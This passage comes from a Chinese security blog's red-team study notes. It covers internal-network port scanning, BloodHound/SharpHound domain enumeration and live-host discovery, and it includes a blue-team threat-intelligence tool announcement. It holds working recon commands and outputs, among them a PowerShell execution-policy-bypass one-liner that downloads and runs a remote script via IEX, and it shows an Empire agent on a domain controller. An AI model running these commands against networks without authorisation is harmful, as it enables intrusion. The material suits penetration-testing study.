扫描器</h2><p>S 扫描器支持大网段扫描，扫描速度也很快，是比较早期的一款扫描工具了，比较适合运行在 Windows Server 2003 以下版本的操作系统中，下载地址：<a href="https://pan.baidu.com/s/1gdGM4F5">https://pan.baidu.com/s/1gdGM4F5</a></p><blockquote><p>值得提一句的是在我下载该工具到本地后，火绒立马给它删了，而其他的扫描工具火绒都没告警。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">s.exe tcp 192.168.7.7 22,80,443,445 7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;s.exe tcp 192.168.7.7 22,80,443,445 7TCP Port Scanner V1.1 By WinEggDropNormal Scan: About To Scan 4 Ports Using 7 Thread192.168.7.7      445   OpenScan 192.168.7.7 Complete In 0 Hours 0 Minutes 3 Seconds. Found 1 Open Ports<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6、PowerShell-脚本"><a href="#6、PowerShell-脚本" class="headerlink" title="6、PowerShell 脚本"></a>6、PowerShell 脚本</h2><h3 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h3><p>PowerSploit 的 Invoke-Portscan 脚本下载地址：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1</a></p><p>无文件形式（推荐）</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Recon&#x2F;Invoke-Portscan.ps1&#39;);Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#39;445,1433,80,8080,3389&#39;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>如果报错，估计是网络的问题</p></blockquote><p>有文件形式</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -Command &quot;Import-Module .&#x2F;Invoke-Portscan.ps1;Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#39;445,1433,80,8080,3389&#39;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;powershell.exe -exec bypass -Command &quot;Import-Module .&#x2F;Invoke-Portscan.ps1;Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#39;445,1433,80,8080,3389&#39;&quot;Hostname      : 192.168.7.7alive         : TrueopenPorts     : &#123;445, 3389&#125;closedPorts   : &#123;8080, 80, 1433&#125;filteredPorts : &#123;&#125;finishTime    : 2021&#x2F;2&#x2F;24 下午 21:14:06<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h3><p>nishang 的 Invoke-Portscan 脚本下载地址：<a href="https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Scan/Invoke-PortScan.ps1">https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Scan/Invoke-PortScan.ps1</a></p><pre class="line-numbers language-none"><code class="language-none">Invoke-PortScan -StartAddress 192.168.7.7 -EndAddress 192.168.7.7 -ScanPort -Port 80,443,445<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\daniel10&gt; Import-Module .\Invoke-Portscan.ps1PS C:\Users\daniel10&gt; Invoke-PortScan -StartAddress 192.168.7.7 -EndAddress 192.168.7.7 -ScanPort -Port 80,443,445IPAddress   HostName Ports---------   -------- -----192.168.7.7          &#123;445&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7、MSF"><a href="#7、MSF" class="headerlink" title="7、MSF"></a>7、MSF</h2><p>万能的 MSF 自然也是能够进行端口探测的，MSF 中用于端口探测的模块有：</p><pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;ack          TCP ACK端口扫描auxiliary&#x2F;scanner&#x2F;portscan&#x2F;ftpbounce    FTP bounce端口扫描auxiliary&#x2F;scanner&#x2F;portscan&#x2F;syn         SYN端口扫描auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp          TCP端口扫描  auxiliary&#x2F;scanner&#x2F;portscan&#x2F;xmas         TCP XMas端口扫描……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除了上述工具外，还有 nmap、masscan 什么的就不多说了，读者如果感兴趣可以自行尝试玩玩。</p><blockquote><p>参考文章：</p><p><a href="https://pingmaoer.github.io/2020/03/30/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80/">https://pingmaoer.github.io/2020/03/30/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【工具分享】写了一个威胁情报收集的小工具</title>
      <link href="//210315-133209.html"/>
      <url>//210315-133209.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>tig <code>Threat Intelligence Gathering</code> 威胁情报收集，旨在提高蓝队拿到攻击 IP 后对其进行威胁情报信息收集的效率，目前已集成微步、IP 域名反查、Fofa 信息收集、ICP 备案查询、IP 存活检测五个模块，现已支持以下信息的查询：</p><ul><li>✅ 微步标签</li><li>✅ IP 域名反查</li><li>✅ ICP 备案查询</li><li>✅ IP 存活检测</li><li>✅ 开放端口查询</li><li>……</li></ul><p>后续将集成更多模块，如有好的建议或遇到 Bug 欢迎与我反馈，我的微信号：teamssix_com</p><p>工具地址：<a href="https://github.com/wgpsec/tig">https://github.com/wgpsec/tig</a>，或点击查看原文链接进行打开</p><p>如果感觉工具还行，欢迎各位师傅赏个 star</p><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><p>需要 python3 环境支持</p><pre class="line-numbers language-none"><code class="language-none">pip3 install -r requirements.txtpython3 tig.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h1><p>工具命令如下：</p><pre class="line-numbers language-none"><code class="language-none">-h, --help  查看帮助信息-c CONFIG   指定配置文件，默认 .&#x2F;config.ini-f FILE     IP 文本，一行一个-i IP       目标 IP-p PROXY    指定代理，比如：http:&#x2F;&#x2F;127.0.0.1:1080 或者 socks5:&#x2F;&#x2F;127.0.0.1:1080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在开始使用工具之前，需要对配置文件进行配置，默认配置文件如下：</p><pre class="line-numbers language-none"><code class="language-none">[Threat Intelligence]# 微步威胁情报查询，查看 api 地址：https:&#x2F;&#x2F;x.threatbook.cn&#x2F;nodev4&#x2F;vb4&#x2F;myAPI（每天 50 次的免费额度）ThreatBook_enable &#x3D; trueThreatBook_api &#x3D; &#39;&#39;[IP Passive Information]# IP 反查，调用 http:&#x2F;&#x2F;api.hackertarget.com&#x2F;reverseiplookup&#x2F; 的 api，每个 IP 限制每天 100 次免费查询IP_reverse_enable &#x3D; true# ICP 备案信息查询，调用 https:&#x2F;&#x2F;api.vvhan.com&#x2F;api&#x2F;icp 的 api，如果目标 IP 没有反查到域名，该项即使开启也不会有输出ICP_beian_enable &#x3D; true# Fofa ip 信息查询，查看 api 地址：https:&#x2F;&#x2F;fofa.so&#x2F;user&#x2F;users&#x2F;detail（付费，普通会员每次100条，高级会员每次10000条）Fofa_enable &#x3D; trueFofa_email &#x3D; &#39;&#39;Fofa_api &#x3D; &#39;&#39;[IP Active Information]# 利用 ping 命令对 IP 进行存活检测IP_survive_enable &#x3D; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在配置文件里添加自己的微步 API 和 Fofa API 才可使用相关模块，添加 API 后，就可以正常使用相关模块了。</p><p>例如这里获取某个 IP 的信息，直接使用 -i 命令即可，如果想使用代理可以使用 -p 命令。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-03-15_13-03-47.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x03-最后"><a href="#0x03-最后" class="headerlink" title="0x03 最后"></a>0x03 最后</h1><p>如果在工具使用的过程中发现存在 bug 等问题，欢迎与我反馈，我的微信号：teamssix_com，同时也欢迎关注我的个人微信公众号：TeamsSix</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 工具分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 蓝队 </tag>
            
            <tag> 威胁情报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】5、BloodHound 的使用</title>
      <link href="//210226-190853.html"/>
      <url>//210226-190853.html</url>
      
        <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>BloodHound 使用可视化图形显示域环境中的关系，攻击者可以使用 BloodHound 识别高度复杂的攻击路径，防御者可以使用 BloodHound 来识别和防御那些相同的攻击路径。蓝队和红队都可以使用 BloodHound 轻松深入域环境中的权限关系。</p><p>BloodHound 通过在域内导出相关信息，在将数据收集后，将其导入Neo4j 数据库中，进行展示分析。因此在安装 BloodHound 时，需要安装 Neo4j 数据库。</p><h2 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h2><p>因为 Neo4j 数据库需要 Java 支持，因此安装 BloodHound 需要先安装 Java，这里以 Windows 系统下的安装为例。</p><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>JDK 需要下载最新版本，不然 Neo4j 运行可能会报错，JDK 下载地址：<a href="https://www.oracle.com/java/technologies/javase-downloads.html">https://www.oracle.com/java/technologies/javase-downloads.html</a>，下载之后，直接安装即可。</p><h3 id="Neo4j"><a href="#Neo4j" class="headerlink" title="Neo4j"></a>Neo4j</h3><p>Neo4j 直接下载最新版本，下载地址：<a href="https://neo4j.com/download-center/#community">https://neo4j.com/download-center/#community</a></p><p>下载最新版本之后解压下载文件，打开 bin 目录，执行命令<code>neo4j.bat console</code>，之后打开浏览器访问 <a href="http://localhost:7474/">http://localhost:7474</a> 登陆后台，输入以下信息连接到数据库说明安装就完成了。</p><pre class="line-numbers language-none"><code class="language-none">URL：neo4j:&#x2F;&#x2F;localhost:7687用户名(默认)：neo4j密码(默认)：neo4j<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>BloodHound 项目地址：<a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a>，下载后解压打开 BloodHound.exe，输入 Neo4j 数据库的账号密码即可完成安装。</p><h2 id="3、使用"><a href="#3、使用" class="headerlink" title="3、使用"></a>3、使用</h2><p>安装完成 BloodHound 后，需要进行数据的采集与导入，数据的采集可以使用 ps1 脚本或者使用 exe 程序收集，工具下载地址：<a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors</a></p><p>这里使用 SharpHound.exe 进行数据的采集，将 SharpHound.exe 拷贝到目标上，执行 <code>SharpHound.exe -c all</code> 进行数据采集。</p><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;SharpHound.exe -c all---------------------------------------------Initializing SharpHound at 22:36 on 2021&#x2F;2&#x2F;25---------------------------------------------Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container[+] Creating Schema map for domain TEAMSSIX.COM using path CN&#x3D;Schema,CN&#x3D;Configuration,DC&#x3D;teamssix,DC&#x3D;com[+] Cache File Found! Loaded 1332 Objects in cache[+] Pre-populating Domain Controller SIDSStatus: 0 objects finished (+0) -- Using 24 MB RAMStatus: 673 objects finished (+673 134.6)&#x2F;s -- Using 43 MB RAMEnumeration finished in 00:00:05.3136324Compressing data to .\20210225223622_BloodHound.zipYou can upload this file directly to the UISharpHound Enumeration Completed at 22:36 on 2021&#x2F;2&#x2F;25! Happy Graphing!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果使用 ps1 脚本收集，命令为：</p><pre class="line-numbers language-none"><code class="language-none">powershell -exec bypass -command &quot;Import-Module .&#x2F;SharpHound.ps1; Invoke-BloodHound -c all&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>采集到的数据会以 zip 压缩包的格式保存，将其拷贝到 BloodHound 所在主机上，在 BloodHound 右侧图标里点击 Upload Data，之后上传刚才生成的压缩包就可以导入数据了。</p><blockquote><p>或者直接将 zip 压缩包拖拽到 BloodHound 里也可以导入数据。</p></blockquote><p>在 BloodHound 右上角有三个板块：</p><p>1、Database Info（数据库信息），可以查看当前数据库中的域用户、域计算机等统计信息。</p><p>2、Node Indo（节点信息），单击某个节点时，在这里可以看到对应节点的相关信息。</p><p>3、Analysis（分析查询），在 BloodHound 中预设了一些查询条件，具体如下：</p><pre class="line-numbers language-none"><code class="language-none">1、查询所有域管理员2、寻找到域管理员的最短路径3、查找具有DCSync权限的主体4、具有外部域组成员资格的用户5、具有外部域名组成员资格的组6、映射域信任7、到无约束委托系统的最短路径8、到达Kerberoastable用户的最短路径9、从Kerberoastable用户到域管理员的最短路径10、拥有的主体的最短路径11、从拥有的主体到域管理员的最短路径12、到高价值目标的最短路径13、查找域用户是本地管理员的计算机14、查找域用户可以读取密码的计算机15、从域用户到高价值目标的最短路径16、找到从域用户到高价值目标的所有路径17、找到域用户可以RDP的工作站18、找到域用户可以RDP的服务器19、查找域用户组的危险权限20、找到高价值群体中能够支持kerberoable的成员21、列出所有kerberoable用户22、查找具有大多数特权的Kerberoastable用户23、查找到非域控制器的域管理登录24、查找不支持操作系统的计算机25、查找AS-REP Roastable用户(DontReqPreAuth)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>比如这里查询到域管理员的最短路径</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-25_14-00-42.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>路径由粗到细表示xx对xx有权限或关系</p></blockquote><p>总的来说感觉 BloodHound 还是挺有意思的，可以很直观的看到域内主机间的关系。不过毕竟是辅助工具，还是需要不断提升自己的实力、经验才能更好的去分析这样的一个结果才是。</p><blockquote><p>参考链接：</p><p><a href="https://xz.aliyun.com/t/7311">https://xz.aliyun.com/t/7311</a></p><p><a href="https://www.freebuf.com/sectool/179002.html">https://www.freebuf.com/sectool/179002.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】域内主机存活探测的一些方法总结</title>
      <link href="//210224-210909.html"/>
      <url>//210224-210909.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>注：本文中的工具均来源自互联网，后门自查。</p></blockquote><p>在进入目标域后，对域内主机进行存活探测是不可或缺的一步，在此记录一下亿些常见的方法。</p><h2 id="1、ping"><a href="#1、ping" class="headerlink" title="1、ping"></a>1、ping</h2><p>使用 ping 进行检测的优点是不容易触发检测规则，缺点是速度较慢，如果目标开启了禁止 ping 的策略，那这个方法就 gg 了。</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><pre class="line-numbers language-none"><code class="language-none">for &#x2F;l %i in (1,1,255) do @ping 192.168.7.%i -w 1 -n 1|find &#x2F;i &quot;ttl&#x3D;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;for &#x2F;l %i in (1,1,255) do @ping 192.168.7.%i -w 1 -n 1|find &#x2F;i &quot;ttl&#x3D;&quot;来自 192.168.7.7 的回复: 字节&#x3D;32 时间&lt;1ms TTL&#x3D;128来自 192.168.7.107 的回复: 字节&#x3D;32 时间&#x3D;1ms TTL&#x3D;64来自 192.168.7.110 的回复: 字节&#x3D;32 时间&lt;1ms TTL&#x3D;128<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><pre class="line-numbers language-none"><code class="language-none">for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#39;&#123;print $4&#125;&#39;; done<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">teamssix@localhost:~#  for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#39;&#123;print $4&#125;&#39;; done192.168.7.7192.168.7.107192.168.7.110<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="VBS"><a href="#VBS" class="headerlink" title="VBS"></a>VBS</h3><pre class="line-numbers language-none"><code class="language-none">strSubNet &#x3D; &quot;192.168.7.&quot;  Set objFSO&#x3D; CreateObject(&quot;Scripting.FileSystemObject&quot;)  Set objTS &#x3D; objfso.CreateTextFile(&quot;C:\Result.txt&quot;)   For i &#x3D; 1 To 254  strComputer &#x3D; strSubNet &amp; i  blnResult &#x3D; Ping(strComputer)  If blnResult &#x3D; True Then  objTS.WriteLine strComputer &amp; &quot; is alived ! :) &quot;  End If  Next   objTS.Close  WScript.Echo &quot;All Ping Scan , All Done ! :) &quot;    Function Ping(strComputer)  Set objWMIService &#x3D; GetObject(&quot;winmgmts:\\.\root\cimv2&quot;) Set colItems &#x3D; objWMIService.ExecQuery(&quot;Select * From Win32_PingStatus Where Address&#x3D;&#39;&quot; &amp; strComputer &amp; &quot;&#39;&quot;) For Each objItem In colItems  Select case objItem.StatusCode  Case 0  Ping &#x3D; True  Case Else  Ping &#x3D; False  End select  Exit For  Next  End Function<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、PowerShell"><a href="#2、PowerShell" class="headerlink" title="2、PowerShell"></a>2、PowerShell</h2><h3 id="TSPingSweep"><a href="#TSPingSweep" class="headerlink" title="TSPingSweep"></a>TSPingSweep</h3><p>PowerShell TSPingSweep 扫描脚本下载地址：</p><p><a href="https://raw.githubusercontent.com/dwj7738/My-Powershell-Repository/master/Scripts/Invoke-TSPingSweep.ps1">https://raw.githubusercontent.com/dwj7738/My-Powershell-Repository/master/Scripts/Invoke-TSPingSweep.ps1</a></p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -Command &quot;Import-Module .&#x2F;Invoke-TSPingSweep.ps1; Invoke-TSPingSweep -StartAddress 192.168.7.1 -EndAddress 192.168.7.254 -ResolveHost -ScanPort -Port 445,135&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-23_21-02-52.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;powershell.exe -exec bypass -Command &quot;Import-Module .&#x2F;Invoke-TSPingSweep.ps1; Invoke-TSPingSweep -StartAddress 192.168.7.1 -EndAddress 192.168.7.254 -ResolveHost -ScanPort -Port 445,135&quot;IPAddress     HostName             Ports---------     --------             -----192.168.7.7   dc.teamssix.com      &#123;445, 135&#125;192.168.7.107 DANIEL7.teamssix.com &#123;445, 135&#125;192.168.7.110 daniel10.teamssix... &#123;445, 135&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ARPScan"><a href="#ARPScan" class="headerlink" title="ARPScan"></a>ARPScan</h3><p>PowerShell ARPScan 扫描脚本下载地址：<a href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/Invoke-ARPScan.ps1">https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/Invoke-ARPScan.ps1</a></p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -Command &quot;Import-Module .&#x2F;Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.7.0&#x2F;24&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;powershell.exe -exec bypass -Command &quot;Import-Module .&#x2F;Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.7.0&#x2F;24&quot;MAC               Address---               -------16:7D:DA:D7:8F:64 192.168.7.100:0C:29:1D:82:CF 192.168.7.700:0C:29:A9:62:98 192.168.7.10700:0C:29:DC:01:0D 192.168.7.11000:0C:29:DC:01:0D 192.168.7.255<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、arp-scan"><a href="#3、arp-scan" class="headerlink" title="3、arp-scan"></a>3、arp-scan</h2><p>arp-scan 使用 ARP 协议进行探测。arp-scan Windows 下载地址：<a href="https://github.com/QbsuranAlang/arp-scan-windows-">https://github.com/QbsuranAlang/arp-scan-windows-</a></p><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;arp-scan.exe -t 192.168.7.0&#x2F;24Reply that 16:7D:DA:D7:8F:64 is 192.168.7.1 in 11.278300Reply that 00:0C:29:1D:82:CF is 192.168.7.7 in 16.140500Reply that 00:0C:29:A9:62:98 is 192.168.7.107 in 15.233500Reply that 00:0C:29:DC:01:0D is 192.168.7.110 in 0.080700Reply that 00:0C:29:DC:01:0D is 192.168.7.255 in 0.071500<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4、arp-ping"><a href="#4、arp-ping" class="headerlink" title="4、arp-ping"></a>4、arp-ping</h2><p>Arp-ping 基于 arp 协议，它可以 “ping” 受防火墙保护的主机，下载地址：<a href="https://www.elifulkerson.com/projects/arp-ping.php">https://www.elifulkerson.com/projects/arp-ping.php</a></p><p>由于 arp-ping 只能一次 ping 一台主机，但在测试过程中肯定不能一台一台的 ping ，所以这里参考上面的 ping 脚本写了一个 arp-ping 循环 ping 主机的脚本。</p><pre class="line-numbers language-none"><code class="language-none">for &#x2F;l %i in (1,1,255) do @arp-ping.exe 192.168.7.%i -w 1 -n 1|find &#x2F;i &quot;Reply&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;for &#x2F;l %i in (1,1,255) do @arp-ping.exe 192.168.7.%i -w 1 -n 1|find &#x2F;i &quot;Reply&quot;Reply that 16:7D:DA:D7:8F:64 is 192.168.7.1 in 2.233msReply that 00:0C:29:A9:62:98 is 192.168.7.107 in 16.857msReply that 00:0C:29:DC:01:0D is 192.168.7.110 in 0.205msReply that 00:0C:29:DC:01:0D is 192.168.7.255 in 0.200ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5、Empire"><a href="#5、Empire" class="headerlink" title="5、Empire"></a>5、Empire</h2><p>Empire 内置了arpscan 模块，该模块可利用 arp 协议对内网主机进行探测。将目标主机上线 Empire 后，使用 powershell/situational_awareness/network/arpscan 模块，设置扫描范围即可，具体如下：</p><pre class="line-numbers language-none"><code class="language-none">(Empire: listeners) &gt; agents[*] Active agents: Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen ----     -- -----------     ------------      --------                -------            ---    -----    --------- APDGSW9X ps 192.168.7.7     DC                *TEAMSSIX\administrator powershell         3648   5&#x2F;0.0    2021-02-23 20:43:27(Empire: agents) &gt; usemodule powershell&#x2F;situational_awareness&#x2F;network&#x2F;arpscan(Empire: powershell&#x2F;situational_awareness&#x2F;network&#x2F;arpscan) &gt; set Agent APDGSW9X(Empire: powershell&#x2F;situational_awareness&#x2F;network&#x2F;arpscan) &gt; set CIDR 192.168.7.0&#x2F;24(Empire: powershell&#x2F;situational_awareness&#x2F;network&#x2F;arpscan) &gt; executeMAC               Address      ---               -------      16:7D:DA:D7:8F:64 192.168.7.1  00:0C:29:1D:82:CF 192.168.7.7  00:0C:29:A9:62:98 192.168.7.10700:0C:29:DC:01:0D 192.168.7.11000:0C:29:1D:82:CF 192.168.7.255<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6、nbtscan"><a href="#6、nbtscan" class="headerlink" title="6、nbtscan"></a>6、nbtscan</h2><p>nbtscan 有 Windows 和 Linux 两个版本，使用 netbios 协议扫描本地或远程 TCP/IP 网络上的开放 NetBIOS 名称服务器。</p><p>nbtscan 下载地址：<a href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a></p><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;nbtscan.exe 192.168.7.0&#x2F;24192.168.7.1     \DP192.168.7.7     TEAMSSIX\DC                     SHARING DC192.168.7.107   TEAMSSIX\DANIEL7                SHARING*timeout (normal end of scan)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7、unicornscan"><a href="#7、unicornscan" class="headerlink" title="7、unicornscan"></a>7、unicornscan</h2><p>unicornscan 使用 UDP 协议，在 kali 下可以直接 apt-get 进行安装，这个使用起来感觉有点慢。</p><pre class="line-numbers language-none"><code class="language-none">teamssix@localhost:~# unicornscan -mU 192.168.7.7UDP open          domain[   53]from 192.168.7.7  ttl 127teamssix@localhost:~# for k in $( seq 1 255);do unicornscan -mU 192.168.7.$k|grep &quot;open&quot;|awk -F &quot;[ :]+&quot; &#39;&#123;print $5&#125;&#39;; done192.168.7.1192.168.7.7192.168.7.107<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8、scanline"><a href="#8、scanline" class="headerlink" title="8、scanline"></a>8、scanline</h2><p>McAfee 出品，推荐 win 下使用（管理员执行），scanline 项目地址：<a href="www.mcafee.com/us/downloads/free-tools/termsofuse.aspx">www.mcafee.com/us/downloads/free-tools/termsofuse.aspx</a></p><p>但是项目地址的下载按钮貌似失效，其他的下载地址：<a href="https://www.lanzous.com/i32zncf">https://www.lanzous.com/i32zncf</a></p><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;scanline.exe -n 192.168.7.0-255ScanLine (TM) 1.01Copyright (c) Foundstone, Inc. 2002http:&#x2F;&#x2F;www.foundstone.comScan of 256 IPs started at Tue Feb 23 22:07:40 2021-------------------------------------------------------------------------------192.168.7.7Responded in 0 ms.0 hops awayResponds with ICMP unreachable: No-------------------------------------------------------------------------------192.168.7.107Responded in 0 ms.0 hops awayResponds with ICMP unreachable: No-------------------------------------------------------------------------------192.168.7.110Responded in 0 ms.0 hops awayResponds with ICMP unreachable: 